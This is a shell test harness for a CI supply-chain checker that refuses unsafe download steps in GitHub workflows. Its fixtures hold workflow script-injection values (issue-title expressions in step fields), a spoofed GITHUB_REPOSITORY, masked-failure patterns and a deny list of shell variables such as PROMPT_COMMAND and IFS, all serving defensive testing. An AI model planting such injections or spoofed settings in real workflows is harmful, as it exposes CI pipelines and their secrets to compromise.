wfcase "      - env:"$'\n'"          GH_TOKEN: plain"$'\n'"        run: |"$'\n'"          $LIT" 1 'B4: a curl step env: GH_TOKEN with a value other than the token expressions is refused'
ifrepo ifgr "${SUPPORT[@]}" head .github/workflows/rel.yml "$(printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      GITHUB_REPOSITORY: evil/x\n    steps:\n%s\n' "$STEP276")"
ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GH276" repo:self)"; ifck ifgr "$work/if-w.json"
CASE="AC19 (B4): a job-level env: GITHUB_REPOSITORY for a repo:self line is refused: exit 1"
check test "$rc" -eq 1; check grep -q 'GITHUB_' "$work/if.out"
wfcase "      - run: |"$'\n'"          cat >/dev/null <<EOF"$'\n'"          x"$'\n'"          EOF"$'\n'"          $LIT" 1 'a << in the run: block holding a ruled curl line is refused'
# R2: the Python form needs both stdout=sys.stderr and stderr=sys.stderr
pycase "${PYF/, stdout=sys.stderr, stderr=sys.stderr/}" 1 'R2: the Python form with no keywords is refused'
pycase "${PYF/, stderr=sys.stderr/}" 1 'R2: the Python form without stderr=sys.stderr is refused'
# R3: no ${{ anywhere in a ruled step outside its env: values (and env: values only the allowed expressions)
wfcase "      - working-directory: \${{ github.event.inputs.d }}"$'\n'"        run: |"$'\n'"          $LIT" 1 'R3: ${{ }} in working-directory: of the ruled step is refused'
wfcase "      - name: \${{ github.event.issue.title }}"$'\n'"        run: |"$'\n'"          $LIT" 1 'R3: ${{ }} in name: of the ruled step is refused'
wfcase "      - env:"$'\n'"          T: \${{ github.event.issue.title }}"$'\n'"        run: |"$'\n'"          $LIT" 1 'R3: an env: value with another ${{ }} in the ruled step is refused'
wfcase "      - env:"$'\n'"          T: \${{ github.token }}"$'\n'"        run: |"$'\n'"          $LIT" 0 'R3 control: an env: value ${{ github.token }} passes'
# R4: more denied output names, compared without case
for nm in RUNNER_TEMP GITHUB_STATE GITHUB_WORKSPACE IFS CDPATH PS4 PROMPT_COMMAND SHELLOPTS BASHOPTS path home; do
  hostcase "$C -o \"\$$nm/x\" $U" 1 "R4: an output under \$$nm (denied, any case) is refused"
done
# R5: a failed fetch must not exit 0
hostcase "$C $O $U || exit 0" 1 'R5: CMD || exit 0 is refused'
hostcase "$C $O $U"' || die "x" 0' 1 'R5: CMD || die "x" 0 is refused'
hostcase "$C $O $U || exit 10" 1 'R5: CMD || exit 10 (not 1 to 9) is refused'
# cheap limits closed: a ruled step or its job with if: false or continue-on-error: true does not count
yvcase "$FSTEP"$'\n'"      - if: false"$'\n'"        run: |"$'\n'"          $VLINE" "$CURL276" github.com "$VLINE" true 1 'a verifier line in a step with if: false is refused'
yvcase "$FSTEP"$'\n'"      - continue-on-error: true"$'\n'"        run: |"$'\n'"          $VLINE" "$CURL276" github.com "$VLINE" true 1 'a verifier line in a step with continue-on-error: true is refused'
wfcase "      - continue-on-error: true"$'\n'"        run: |"$'\n'"          $LIT" 1 'a fetch line in a step with continue-on-error: true is refused'
ifrepo ifjf "${SUPPORT[@]}" head .github/workflows/f.yml "$(printf 'on: push\njobs:\n  j:\n    if: false\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          %s\n' "$LIT")"
ifx "$work/if-wf.json" plain "$(ifrow .github/workflows/f.yml "$LIT" "$HOSTN")"; ifck ifjf "$work/if-wf.json"
CASE="AC19: a fetch line in a job with if: false is refused: exit 1"
check test "$rc" -eq 1
for ov in '{"host": "repo:other"}' '{"host": "repo:"}' '{"form": "a download"}'; do
  ifx "$work/if-bad.json" plain "$(ifrow bin/rel.sh "$GHD" repo:self "$ov")"; ifck ifm "$work/if-bad.json"
  CASE="AC19 (repo:self): a malformed row ($ov) stops the check fail-closed: exit 2, names the list"
  check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"
done
ifx "$work/if-bad.json" plain "$(ifrow bin/fetch.sh "$LIT" repo:self)"; ifck ifm "$work/if-bad.json"
CASE="AC19 (repo:self): host repo:self on a curl download (form 'a download') stops the check: exit 2"
check test "$rc" -eq 2
ifx "$work/if-bad.json" plain "$(ifrow bin/rel.sh "$GHD" "$HOSTN")"; ifck ifm "$work/if-bad.json"
CASE="AC19 (repo:self): a gh release download row with a host other than repo:self stops the check: exit 2"
check test "$rc" -eq 2
CASE="AC19: the committed exceptions file holds an unmeasured_input_fetch list (empty in this change) that loads, and its format note"
check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
d = json.load(open(sys.argv[2]))
assert d["unmeasured_input_fetch"] == [] and ac.load_input_fetch(sys.argv[2], required=True) == {}, d.get("unmeasured_input_fetch")
assert "REQ-SUP-001-AC19" in d["_format_unmeasured_input_fetch"]
PY

# --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
mkdir -p "$work/stubbin"
cat >"$work/stubbin/gh" <<'STUB'
#!/bin/sh
case "$GH_MODE" in
  ratelimit) echo "gh: API rate limit exceeded for user ID 1 (HTTP 403)" >&2; exit 1;;
  notfound)  echo "gh: Not Found (HTTP 404)" >&2; exit 1;;
esac
exit 1
STUB
chmod +x "$work/stubbin/gh"
newcase livea "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')"
live() { rc=0; ( cd "$work" && env -u GITHUB_REPOSITORY GH_MODE="$1" PATH="$work/stubbin:$PATH" python3 "$chk" --root "$work/livea" --base HEAD~1 --head HEAD --now "$NOW" ) >"$work/live.out" 2>&1 || rc=$?; }
live ratelimit
CASE="live: GitHub's rate limit is 'could not look': exit 2, says so and is not a pass"
check test "$rc" -eq 2; check grep -qi 'rate limit' "$work/live.out"
live notfound
CASE="live: a 404 (no release for that commit) is 'age not provable': exit 1"
check test "$rc" -eq 1; check grep -qi 'not provable' "$work/live.out"

# --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
# its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
cat >"$work/ibt-inv.py" <<'PY'
import importlib.util, os, re, sys
SC = sys.argv[1]
HOST = "https://github.com/"
TOOLS = {"melange": "chainguard-dev/melange", "apko": "chainguard-dev/apko"}
ARCHES = ("amd64", "arm64")
def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), os.path.join(SC, name + ".py"))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
def die(msg):
    print("install-build-tools: " + msg); sys.exit(1)
def inventory(path):
    inv = load("pin-inventory"); age = load("pin-age-check")
    text = open(path).read(); f = {"bin/install-build-tools.sh": text}
    um = inv.unmeasured(f)
    if um:
        die("unmeasured: " + "; ".join("%s: %s" % (w, l) for (_, w, l) in sorted(um)))
    vers = {}
    for t in TOOLS:
        m = re.search(re.escape(HOST + TOOLS[t]) + r"/releases/download/v(\d+\.\d+\.\d+)/", text)
        if not m:
            die("no literal release address for " + t)
        vers[t] = m.group(1)
    want = {(TOOLS[t], "v" + vers[t], "%s_%s_linux_%s.tar.gz" % (t, vers[t], a)) for t in TOOLS for a in ARCHES}
    got = set()
    for it in inv.inventory(f).values():
        repo = age.TOOL_REPOS.get(it.name) or (it.name if re.fullmatch(r"[\w.-]+/[\w.-]+", it.name) else None)
        if it.kind != "tool" or not repo or not age.is_pin(it.version) or re.search(r"\$\{|\(variable\)|\(expression\)|\(unmeasured", it.name) or "#" not in it.path:
            die("not a measurable pin with its checksum bound: " + it.key)
        got.add((it.name, it.version, it.path.split("#")[0]))
    if got != want:
        die("measured %s, wanted %s" % (sorted(got), sorted(want)))
    print("measured: " + ", ".join(sorted("%s@%s %s" % g for g in got)))
def mutate(src, out, kind):
    lines = open(src).read().split("\n")
    def edit(label, rx, rep):
        for i, ln in enumerate(lines):
            if re.match(r"^\s*%s\)" % re.escape(label), ln):
                new, k = re.subn(rx, rep, ln, count=1)
                if k == 1:
                    lines[i] = new; return
        print("mutant %s did not apply" % kind); sys.exit(3)
    if kind == "variable":
        edit("melange-amd64", r"/download/v[^/]+/", "/download/v$ver/")
    elif kind == "repovar":
        edit("apko-amd64", re.escape(HOST) + r"[\w.-]+/[\w.-]+/", lambda m: HOST + "$repo/")
    elif kind == "mismatch":
        edit("apko-arm64", r"/download/v(\d+)\.(\d+)\.(\d+)/apko_\d+\.\d+\.\d+_", lambda m: "/download/v{0}.{1}.{2}/apko_{0}.{1}.{2}_".format(m.group(1), m.group(2), int(m.group(3)) + 1))
    else:
        print("unknown mutant " + kind); sys.exit(2)
    open(out, "w").write("\n".join(lines))
{"inventory": lambda: inventory(sys.argv[3]), "mutate": lambda: mutate(sys.argv[3], sys.argv[4], sys.argv[5])}[sys.argv[2]]()
PY
ibt() { python3 "$work/ibt-inv.py" "$here/../supply-chain" "$@" </dev/null >"$work/ibt.out" 2>&1; }
# ibt_refused KIND REGEX [RUNNER]: the inventory command is ibt unless a harness case names a stub as the third argument (never read from the environment)
ibt_refused() { local kind=$1 kw=$2 run=ibt; [ $# -lt 3 ] || run=$3; ibt mutate "$root/bin/install-build-tools.sh" "$work/ibt-$kind.sh" "$kind" || return 1; local rc=0; "$run" inventory "$work/ibt-$kind.sh" || rc=$?
  [ "$rc" -ne 0 ] && [ "$rc" -ne 126 ] && [ "$rc" -ne 127 ] && grep -Eq -- "$kw" "$work/ibt.out"; }   # 126/127: the inventory could not RUN, which is not a refusal
CASE="REQ-SUP-001-AC18: the real inventory measures install-build-tools.sh as 4 pins (melange and apko x amd64 and arm64, owner/repo@vX.Y.Z, checksum bound), nothing unmeasured"
check ibt inventory "$root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18: a variable version in the release address is read as a placeholder, not a pin (pin-age refuses it)"
check ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18: a variable repository in the release address is unmeasured (pin-age refuses it)"
check ibt_refused repovar 'unmeasured: a download'
CASE="REQ-SUP-001-AC18: a URL version that differs from the pinned set is measured as a version outside it"
check ibt_refused mismatch 'wanted'
# the harness itself: a failure to RUN the inventory (exit 126 not executable, 127 not found) is not a refusal, even when the output names the diagnostic
ibt_stub_rc=1 ibt_stub_msg=""
ibt_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; printf '%s' "$ibt_stub_msg" >"$work/ibt.out"; return "$ibt_stub_rc"; }
# stub_refused RC [OUTPUT]: the stub exits RC after printing OUTPUT (default: the expected diagnostic)
stub_refused() { ibt_stub_rc=$1; ibt_stub_msg=${2-install-build-tools: unmeasured: a download}; ibt_refused repovar 'unmeasured: a download' ibt_stub; }
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with the diagnostic counts as a refusal (the stub stands in correctly)"
check stub_refused 1
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be found (exit 127) is not a refusal, even with the diagnostic"
check eval '! stub_refused 127'
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be executed (exit 126) is not a refusal, even with the diagnostic"
check eval '! stub_refused 126'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with a WRONG diagnostic is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 "install-build-tools: measured something else"'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with EMPTY output is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 ""'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 0 WITH the diagnostic is not a refusal (the nonzero status is pinned)"
check eval '! stub_refused 0'
# the inventory command is never read from the environment: with IBT_RUN exported as a stub that always prints a diagnostic and exits 1,
# the real cases still run the real inventory (the stub's diagnostic never satisfies them, the real one does)
ibt_env_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; echo "install-build-tools: unmeasured: a download" >"$work/ibt.out"; return 1; }
# iso W H R CMD...: run CMD in a child bash with IBT_RUN exported as the stub; the paths and the command reach the child as ARGUMENTS, never spliced into its script
iso() { IBT_RUN=ibt_env_stub bash -c "$(declare -f ibt ibt_refused ibt_env_stub)"'
work=$1 here=$2 root=$3; shift 3; "$@"' iso-child "$@"; }
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the variable-version mutant still fails on the REAL diagnostic (not a measurable pin)"
check iso "$work" "$here" "$root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the stub's diagnostic is not what the variable-version mutant yields"
check iso "$work" "$here" "$root" eval '! ibt_refused variable "unmeasured: a download"'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the real positive case still passes"
check iso "$work" "$here" "$root" ibt inventory "$root/bin/install-build-tools.sh"
q="$work/it's a dir"; mkdir -p "$q/agent/tests" "$q/root/bin"; cp -R "$here/../supply-chain" "$q/agent/supply-chain"; cp "$root/bin/install-build-tools.sh" "$q/root/bin/"; cp "$work/ibt-inv.py" "$q/"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the real positive case still passes"
check iso "$q" "$q/agent/tests" "$q/root" ibt inventory "$q/root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the variable-version mutant still fails on the REAL diagnostic"
check iso "$q" "$q/agent/tests" "$q/root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'

echo "pin-age-check: $pass passed, $failn failed"
test "$failn" -eq 0
